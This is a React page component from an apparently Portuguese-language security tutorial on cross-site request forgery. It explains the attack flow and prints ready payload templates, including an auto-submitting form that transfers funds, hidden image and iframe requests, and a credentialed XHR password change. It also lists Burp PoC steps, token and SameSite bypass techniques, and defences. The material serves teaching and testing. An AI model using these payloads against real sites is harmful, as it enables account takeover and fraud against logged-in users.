import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CSRF() {
  return (
    <PageContainer
      title="CSRF — Cross-Site Request Forgery"
      subtitle="Entenda e explore ataques CSRF que forçam usuários autenticados a executar ações indesejadas em aplicações web."
      difficulty="intermediario"
      timeToRead="15 min"
    >
      <h2>O que é CSRF?</h2>
      <p>
        <strong>Cross-Site Request Forgery (CSRF)</strong> é um ataque que força um usuário autenticado
        a executar ações indesejadas em uma aplicação web na qual está logado. O atacante cria uma
        página maliciosa que faz requisições automáticas usando as credenciais (cookies) da vítima.
      </p>

      <h2>Como Funciona</h2>
      <CodeBlock
        title="Fluxo de um ataque CSRF"
        code={`# 1. Vítima está logada no banco.com (cookie de sessão ativo)
# 2. Vítima visita página maliciosa do atacante
# 3. Página maliciosa tem HTML que faz POST para banco.com
# 4. Navegador envia cookie automaticamente
# 5. banco.com processa a requisição como legítima
# 6. Resultado: transferência, mudança de senha, etc.`}
      />

      <h2>Exemplos de Payloads CSRF</h2>

      <CodeBlock
        title="CSRF via formulário oculto (POST)"
        code={`<!-- Página maliciosa do atacante -->
<html>
<body onload="document.getElementById('csrf-form').submit();">
  <form id="csrf-form" action="https://banco.com/transferir" method="POST">
    <input type="hidden" name="destino" value="conta-atacante" />
    <input type="hidden" name="valor" value="10000" />
    <input type="hidden" name="confirmar" value="sim" />
  </form>
</body>
</html>

<!-- A vítima nem percebe — formulário é enviado automaticamente -->`}
      />

      <CodeBlock
        title="CSRF via GET (imagem)"
        code={`<!-- Mais simples — funciona se a ação aceita GET -->
<img src="https://app.com/api/delete-account?confirm=true" width="0" height="0" />

<!-- Ou via iframe invisível -->
<iframe src="https://app.com/change-email?email=hacker@evil.com"
        style="display:none;"></iframe>

<!-- Via link -->
<a href="https://app.com/admin/add-user?role=admin&user=hacker">
  Clique para ganhar iPhone!
</a>`}
      />

      <CodeBlock
        title="CSRF com JavaScript (XMLHttpRequest)"
        code={`<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://app.com/api/change-password", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("new_password=hacked123&confirm_password=hacked123");
</script>

<!-- Nota: SOP e CORS podem bloquear a leitura da resposta,
     mas a requisição ainda é enviada! -->`}
      />

      <h2>Testando CSRF com Burp Suite</h2>
      <CodeBlock
        title="Gerar PoC de CSRF automaticamente"
        code={`# No Burp Suite:
# 1. Capturar requisição sensível (ex: mudança de email)
# 2. Clique direito → Engagement tools → Generate CSRF PoC
# 3. Burp gera HTML completo com o formulário
# 4. Salvar como .html e abrir no navegador da vítima

# Teste manual:
# 1. Verificar se existe token CSRF na requisição
# 2. Se não tem token → vulnerável
# 3. Se tem token, testar:
#    - Remover o token completamente
#    - Usar token de outro usuário
#    - Alterar valor do token
#    - Usar token de outra sessão`}
      />

      <h2>Bypass de Proteções CSRF</h2>
      <CodeBlock
        title="Técnicas de bypass"
        code={`# 1. Token não validado — remover o parâmetro
# Original: csrf_token=abc123&action=delete
# Bypass:   action=delete

# 2. Token vinculado à sessão errada
# Usar seu próprio token CSRF (de outra conta)

# 3. Token duplicado no cookie
# Se app verifica cookie == parâmetro:
# Injetar cookie via CRLF ou subdomínio

# 4. Validação apenas por método
# Se POST tem CSRF mas GET não:
# Converter POST → GET

# 5. Content-Type bypass
# Mudar application/json → application/x-www-form-urlencoded
# JSON via form: {"email":"hack"} → email=hack

# 6. Referer bypass
# Adicionar: Referrer-Policy: no-referrer
# Ou: <meta name="referrer" content="no-referrer">

# 7. SameSite cookie bypass
# Se SameSite=Lax (padrão):
# - GET funciona via link direto
# - POST bloqueado
# Se SameSite=None:
# - Tudo funciona (vulnerável)`}
      />

      <h2>Prevenção</h2>
      <CodeBlock
        title="Defesas contra CSRF"
        code={`# 1. Token CSRF sincronizado (melhor prática)
# - Gerar token único por sessão
# - Incluir em formulários e headers
# - Validar no servidor

# 2. SameSite Cookie (defesa padrão moderna)
# Set-Cookie: session=abc; SameSite=Strict
# Strict: cookie nunca enviado cross-site
# Lax: enviado apenas em navegação GET top-level

# 3. Verificação de Referer/Origin
# Verificar header Origin ou Referer

# 4. Double Submit Cookie
# Cookie + parâmetro com mesmo token

# 5. Custom headers (para APIs)
# Verificar X-Requested-With: XMLHttpRequest`}
      />
    </PageContainer>
  );
}
